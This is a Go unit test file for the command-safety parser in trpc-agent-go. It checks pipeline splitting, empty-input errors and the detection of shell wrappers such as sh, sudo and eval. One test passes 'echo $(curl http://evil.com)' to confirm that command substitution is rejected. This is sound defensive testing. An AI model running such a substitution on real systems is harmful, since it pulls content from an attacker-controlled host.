//
// Tencent is pleased to support the open source community by making trpc-agent-go available.
//
// Copyright (C) 2025 Tencent.  All rights reserved.
//
// trpc-agent-go is licensed under the Apache License Version 2.0.
//

package safety

import "testing"

func TestParseCommand_SingleSegment(t *testing.T) {
	p, err := ParseCommand("ls -la")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(p.Segments) != 1 {
		t.Fatalf("expected 1 segment, got %d", len(p.Segments))
	}
	if got, want := p.Segments[0], []string{"ls", "-la"}; !equalStrings(got, want) {
		t.Errorf("argv mismatch: got %v, want %v", got, want)
	}
}

func TestParseCommand_Pipe(t *testing.T) {
	p, err := ParseCommand("echo hello | grep world")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	if len(p.Segments) != 2 {
		t.Fatalf("expected 2 segments, got %d", len(p.Segments))
	}
	if got, want := p.Segments[0][0], "echo"; got != want {
		t.Errorf("first argv: got %q, want %q", got, want)
	}
	if got, want := p.Segments[1][0], "grep"; got != want {
		t.Errorf("second argv: got %q, want %q", got, want)
	}
}

func TestParseCommand_RejectsCommandSubstitution(t *testing.T) {
	// shellsafe should reject this before any rule lookup.
	if _, err := ParseCommand("echo $(curl http://evil.com)"); err == nil {
		t.Error("expected parse error for $(...) substitution")
	}
}

func TestParseCommand_Empty(t *testing.T) {
	if _, err := ParseCommand(""); err == nil {
		t.Error("expected error for empty command")
	}
}

func TestParseCommand_Executables(t *testing.T) {
	p, err := ParseCommand("ls -la | grep foo | wc -l")
	if err != nil {
		t.Fatalf("parse: %v", err)
	}
	got := p.Executables()
	want := []string{"ls", "grep", "wc"}
	if !equalStrings(got, want) {
		t.Errorf("Executables() = %v, want %v", got, want)
	}
}

func TestParseCommand_FirstExecutable(t *testing.T) {
	p, _ := ParseCommand("ls -la")
	if got := p.FirstExecutable(); got != "ls" {
		t.Errorf("FirstExecutable() = %q, want %q", got, "ls")
	}
}

func TestIsShellWrapper(t *testing.T) {
	cases := []struct {
		name string
		want bool
	}{
		{name: "sh", want: true},
		{name: "bash", want: true},
		{name: "sudo", want: true},
		{name: "xargs", want: true},
		{name: "eval", want: true},
		{name: "/usr/bin/SH", want: true},
		{name: "sh.exe", want: true},
		{name: "Sh", want: true},
		{name: "ls", want: false},
		{name: "curl", want: false},
		{name: "", want: false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			if got := IsShellWrapper(c.name); got != c.want {
				t.Errorf("IsShellWrapper(%q) = %v, want %v", c.name, got, c.want)
			}
		})
	}
}

func equalStrings(a, b []string) bool {
	if len(a) != len(b) {
		return false
	}
	for i := range a {
		if a[i] != b[i] {
			return false
		}
	}
	return true
}
